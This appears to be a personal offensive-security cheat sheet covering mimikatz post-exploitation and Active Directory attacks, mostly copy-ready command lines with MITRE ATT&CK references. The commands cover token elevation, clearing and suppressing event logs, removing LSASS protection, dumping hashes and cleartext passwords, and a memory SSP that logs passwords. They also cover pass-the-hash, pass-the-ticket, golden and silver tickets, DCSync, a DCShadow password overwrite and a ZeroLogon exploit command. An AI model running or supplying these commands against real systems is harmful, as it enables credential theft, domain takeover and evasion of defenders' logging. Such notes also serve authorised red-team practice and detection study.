POST Exploitation ATTck
--------------------------------------------------------------------
Log save:
	`mimikatz # log C:\temp\msupdate.log  // save log in this path and u should choose the name for log on this path
	`mimikatz # log /stop

bypass APP Locker:
	`mimikatz # misc::cmd/regedit/taskmgr
	`mimikatz # misc::mflt // list of driver install on system
	`mimikatz # misc::wp /file:C:\\User\\Desktop\\2.png // add wipaper
	`mimikatz # misc::clip // capcher the clip board
		process csrss.exe : remote thread event id 8 sysmon
	`mimikatz # misc::detours // defense evasion

Privilege:
	description:
		event code : 4672  Special privileges assigned to new logon
		event code : 4703 a user right was adjusted
		event code : 4688 process create
	`mimikatz # privilege::debug // debug process to dump hash from lsass ..
	`mimikatz # privilege::driver // load and unload driver HCLM HCLU
	`mimikatz # privilege::security // security log access SeSecurityPrivilege
	`mimikatz # privilege::tcp // SeTcpPrivilege
	`mimikatz # privilege::backup // read access SeBackupPrivilege
	`mimikatz # privilege::restore // whrite access SeStorePrivilege
	`mimikatz # privilege::sysenv // modify memory SeSystemEnviormentPrivilege

Privilege Escalation ATTck
	   description: 
	    when one process is running use the parent process Token
	    impersonation: when a process creating(4688) and use my token ( current user) 
	    event code : 4672
	    mitre : https://attack.mitre.org/techniques/T1134/001
	    Token is privilege 
	    `mimikatz # token::whoami // what is my token user
		`mimikatz # token::list // list of token and process ID
		`mimikatz # token::list /user:administrator
		`mimikatz # token::list /user:system
		`mimikatz # token::list /user:domainadmin
		Token Impersonation
			`mimikatz # token::elevate // elevate token to NT Authority System 
			`mimikatz # token::revert // back to last privilege
		Process Injection ATTck
			link: https://attack.mitre.org/techniques/T1055
			process herpaderping
			what is software doing ? signature change and open mimikatz with name u want 
			link: https://github.com/jxy-s/herpaderping/
			`powershell > .\processherpaderpng.exe .\mimikatz name.exe C:\windows\system32\lsass.exe
			`mimikatz # privilege::debug
			`mimikatz # token::elevate
			`mimikatz # process::runp /process:"fulpath name.exe" /ppid:notpadID

Scenario:
	`mimikatz # privilege::debug
	`mimikatz # token::list
	`mimikatz # token::elevate /user:system
	`mimikatz # token::whoami
	`mimikatz # token::run /process:cmd

Defense Evasion:
	link: https://attack.mitre.org/techniques/T1070/001
	Clear Log: 1102 event code
	we can impact EventViewer to don't generate log 
	event code 4663 : kernel object access 
	`mimikatz # privilege::debug
	`mimikatz # event::clear // clear log
	`mimikatz # event::drop // dont generate log
	`mimikatz # !sysenv // show env
	`mimikatz # !sysenvdel // delete env
	link: https://attack.mitre.org/techniques/T1134/004/
	Parent PID Spoofing
	`mimikatz # privilege::debug
	`mimikatz # token::elevate
	`mimikatz # process::runp /run:"powershell.exe" /ppid:5828
		Note: if u didn't specify ppid default is lsass process

Remote Access
	we cat also use mimikatz server and client to remote conecttion on port 135 rpc
	`mimikatz # base64 /out:true /in:true
 	`mimikatz # rpc::server // win
	`mimikatz # rpc::server /stop // win
	`mimikatz # rpc::connect /server:172.20.10.1 // kali
	encryption algorithm 
	`mimikatz # rpc::server /secure // win
	or
	`mimikatz # rpc::server  //win
	`mimikatz # rpc::connect /server:172.20.10.1 /alg:RC4  //kali
	`mimikatz # rpc::close //win
	RDP Takeover:
	mitre : https://attack.mitre.org/techniques/T1563/002/
	`mimikatz # privilege::debug
	`mimikatz # ts::multirdp  // multi rdp in host enable
	`mimikatz # ts::sessions // show session 
	`mimikatz # ts::remote /id:sessionID /target:sessionID /password:
	Built in:
		`powershell > winrm and winrs
		`powershell > enter-pssession  // psremoting
		`powershell > wmic /node:<172.20.10.1 or hostname> process call create calc

Service:
	stop and start service with mimikatz
	`mimikatz # service::start bits
	`mimikatz # service::stop bits

Persistence via Service:
	`mimikatz # service::+ // start service
	`mimikatz # service::- // stop service

Process:
	`mimikatz # process::list
	`mimikatz # process::run  // hiden run process (Not Interactive)
		exmp:
			`mimikatz # process::run "cmd.exe /c dir"
	`mimikatz # process::runp /run:"fulpath or name.exe" /ppid:notpadID
	`mimikatz # process::start // interactive run process
	`mimikatz # process::stop /pid:number
	`mimikatz # process::suspend /pid:number
	`mimikatz # process::resume /pid:number
	`mimikatz # process::terminate /pid:number

Hash dump:
	description:
		LSA protection : if { UEFI & Secure Boot} then protect the LSA is Enable. 
		location is below 
		`HKLM:\System\CurrentControlSet\Control\Lsa`
			Name : RunAsPPL & Value = Dword 1
		Credential Guard : if { UEFI , 64bit , Virtualization Extention in bios , TMP } then  isolating the `lsass.exe` process use `VSM`
		Virtual secure mode `VSM` : isolated the `LSA` u see `LSAISO`
		SACL : generate lsass log 
		Authentication --> LSA --> Lsass.exe --> Security Support Provider
		Credential is in registry sam file & SSP --> lsass memory
		SSP : security support Provider
		![[MIMIKATZ.png]]
	 By Pass CG & touch Lsass :
		`mimikatz # privilege::debug
		`mimikatz # !+ // load mimidriv.sys
		`mimikatz # !ping // test loaded driver 
		`mimikatz # !bsod // blue screen
		`mimikatz # !processprotect /process:lsass.exe /remove // remove CG
		`mimikatz # privilege::debug
		`mimikatz # lsadump::lsa /patch  // allow user send query to LSA for dump hash
		`mimikatz # lsadump::lsa /inject // process create thread in SSP
		`mimikatz # !process
	 Dump hash touch lsass provider:
		`mimikatz # privilege::debug
		`mimikatz # skurlsa::
		`mimikatz # skurlsa::msv
		`mimikatz # skurlsa::logonpasswords // all provider 
	 Inject SSP
		`mimikatz # privilege::debug
		`mimikatz # misc::memssp // load mimilib.dll in registry with kiwi name
		`CMD > rundll32 user32.dll,LockWorkstation // lock system
		if user lockout and login try again , he's password saved clear text in `C:\Windows\System32\mimilsa.log` this ssp that we load with me mimilib.dll 
	Registry SAM :
		registry SAM is protect by syskey
	`CMD > reg save HKLM\SYSTEM system & reg save HKLM\SAM sam
	`mimikatz # privilege::debug
	`mimikatz # token::elevate
	`mimikatz # lsadump::sam
	Cache Credential 
	reg : `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
	`mimikatz # lsadump::cache
	`mimikatz # lsadump::cache /user: /password: // change password
	`mimikatz # lsadump::secrets // vpn , rdp privete key etc ...

Pass The Hash ATTack
	`mimikatz # privilege::debug
	`mimikatz # sekurlsa::msv
	`mimikatz # sekurlsa::pth /user: /domain:adolf.local /ntlm: /run:command
	`CMD > PsExec.exe \\hostname cmd

ACTIVE DIRECTORY ATTck
---------------------------------------------------------------------

Kerberos :
	KDC/DC : Key Distribution Central / domain controller 
		AS-Req :
			timestamp : pc time encrypted with password hash
			Identity : User, service `exp smb`, domain
		AS-Rep :  KDC send TGT 
		TGS-Req : pc send TGS req to KDC
		TGS-Res : KDC send to pc  TGS
		AP-Req : pc have TGS send request service like smb ftp etc...
		krbtgt: signed the TGT data . krbtgt is a service and it's part of the KDC , krbtgt only can read TGT
		spn: service principle name 
		this is special service name on DC that kerberos and TGS used therefor  spn interaction with kerberos . we can export it with powershell command

Over Pass The Hash ATTck:
	description:
	Defense Evasion: use alternate authentication material
	pass the ticket (ptT) and pass the hash (pth)
	Over Pass The Hash is combination of two attacks: pth and ptT
	we can authenticate via NTLM in active directory and there is not necessary  use kerberos to authentication.
	mitre: https://attack.mitre.org/techniques/T1550/002
	mitre: https://attack.mitre.org/techniques/T1550/003
	Over Pass The Hash:
		`mimikatz # privilege::debug
		`mimikatz # sekurlsa::msv // credential dumping from msv ssp ntlm
		`mimikatz # sekurlsa::pth /user: /domain:sindad.local /ntlm:hash
		Pass The Ticket (TGT) : 
			mitre https://attack.mitre.org/techniques/T1550/003
			in this attack , attacker have TGS or TGT
			if attacker  have TGT then dont need authentication with KDC
			attacker don't need : AS-Req and AS-Res , directly dump TGT from cache on memory on lsass process and send TGS-Req without password to KDC.
			tools we can use to dump TGT: klist and mimikatz
			step 1 . dump ticket from one user on domain
			`mimikatz # privilege::debug
			`mimikatz # kerberos::list  // dump TGT & TGS from cache
			`mimikatz # kerberos::list /export
			`mimikatz # kerberos::tgt  // dump TGT only from cache
			   if dump from lsass use this command:
				`mimikatz # sekurlsa::tickets // dump from lsass tickets
			   if we have password we can request TGT from KDC and export
				`kekeo # tgt::ask /domain:sindad.local /user:ravin /password:1234
			ptT attack:
			step 2 . use the ticket import to mimikatz module :
			`mimikatz # kerberos::ptt .\ // import .kirbi tickets TGT
			now copy server name :
			`mimikatz # kerberos::list  // now we have ticket 
			test for access: maped admin$ :
			`mimikatz # process::run "net use \\servername\admin$"
			we can change password with TGT :
			`kekeo # misc::changepw /tgt:user@local.local.kibri /new:password
			ask TGS from kerberos :
				`mimikatz # kerberos::ask /target:CIFS/Hostname.adolf.local

Golden Ticket (TGT) : 
	mitre : https://attack.mitre.org/techniques/T1558/001
	create golden ticket
	what we need to do get golden ticket?
		domain FQDN : adolf.local
		primary group id: 500, 512, 513 ...
		domain SID : S-1-5 ...
			`mimikatz # net::trust
			`mimikatz # lsadump::trust
		krbtgt hash dump:
			if we are in Access DC : `mimikatz # sekurlsa::krbtgt --> aes128
			remote we should use DcSync : `mimikatz # lsadump::dcsync /user:adolf\krbtgt  /csv --> ntlm 
		Golden attack:
			`mimikatz # kerberos::golden /domain:adolf.local /sid:domainSID (/krbtgt:NTLMhash or /aes128:aeshash) /user:administrator /id:(full SID of User administrator) /ptt(load in memory immediately) /ticket:C:\Temp\cna_golden
			other parameter options:
			`/sids:513(enterprise),500,512(domain admin)
			`/endin:50(50 year)

Silver Ticket (TGS) : 
	SPN: 
		service principle name 
		this is special service name on DC that kerberos and TGS used therefor  spn interaction with kerberos . we can export it with powershell command
		example : 
		SPN                SERVICE		
		TERMSRV       RDP
		SMTPSRV       SMTP
		WSMAN          winrm
		CIFS                SMB
		POP / POP3
		MSSQL
		DNS
		LDAP
		`powershell> $filter='(&(objectCategory=computer)(servicePrincipalName=*))'
		`powershell> $search=[adsisearcher]$filter
		`powershell> $search.PageSize=1000
		`powershell> $search.FindAll().properties
		or
		`powershell> ([adsisearcher]"(&(objectCategory=computer)(name=<hostname>))").findall.properties
	Silver Ticket ATTck:
		`mimikatz # privilege::debug
		`mimikatz # token::elevate
		`mimikatz # lsadump::secrets // copy $MACHINE.ACC (NTLM hash)
		`mimikatz # lsadump::trust or net::trust // for domain sid
		`mimikatz # kerberos::list // for servername
		`mimikatz # kerberos::golden /user:administrator /domain:sindadsec.local /sid:siddomain /ptt /rc4:$MACHINE.ACC (NTLM) /target:hostname.adolf.local /service:cif
		for brute force RC4:
			`kekeo # kerberos::ask /service:cifs/cina.adolf.local /roast /export

DCSync:
	simulation the domain controller and replication with DC dump hash
	event code 4662
	what we need :
	user have in group domain admin or enterprise admin or replicate operator
	`mimikatz # lsadump::dcsync /user:krbtgt
	`mimikatz # lsadump::dcsync /all
	`mimikatz # lsadump::dcsync /all /csv

DCShadow:
	description:
		in this attack we are dc and replicate with origin dc but , attacker inject to special object and replicate with origin dc  unlike dcsync attack 
		user have in group domain admin or enterprise admin or replicate operator
		example : we can change primary group id then normal user convert to domain admin  
		mitre : https://attack.mitre.org/techniques/T1207
		need to do this attack:
		1- we should be domain admin 
		2- stop the firewall
		3- not be dc just domain admin privilege
	how can to see object ? with powershell below command we can see
	`powershell> ([adsisearcher]"(&(objectCategory=computer)(name=<hostname>))").findall.properties
	change attribute badpwdcount . this attribute when user login increased
	step 1: open the mimikatz with system access
	`cmd > psexec64.exe -si cmd 
	`cmd > .\mimikatz
	`mimikatz # lsadump::dcshadow /stack /object:hostname$ /attribute:badpwdcount /value:999
	`mimikatz # lsadump::dcshadow /stack /object:username /attribute:primarygroupid /value:512
	`mimikatz # lsadump::dcshadow  /stack /object:username /attribute:unicodePwd /value:00000000000000000000000000000000 <32charecter>
	`mimikatz # lsadump::dcshadow /viewstack
	`mimikatz # lsadump::dcshadow
	`cmd > .\mimikatz.exe
	`mimikatz # lsadump::dcshadow /push
	to check is it change or not
	`powershell > ([adsisearch]"(&(objectClass=user)(objectCategory=person))").findall().properties

#### ZeroLogon
ZeroLogon is a critical vulnerability in the Netlogon authentication protocol used by Windows Domain Controllers. Due to a flaw in the cryptographic implementation, an attacker within the network can impersonate a domain-joined computer — including the Domain Controller itself.
If exploited on an unpatched system, this vulnerability can lead to full domain compromise by allowing unauthorized privilege escalation and access to sensitive authentication data.	

`mimikatz # lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm

`mimikatz # lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm /exploit

`mimikatz # lsadump::dcsync /domain /dc /user:krbtgt /auth:hostname$ /authdomain: /authpassword:"" /authntlm




##### Resource

link: https://github.com/gentilkiwi/mimikatz/wiki
link: https://zer1t0.gitlab.io/posts/attacking_ad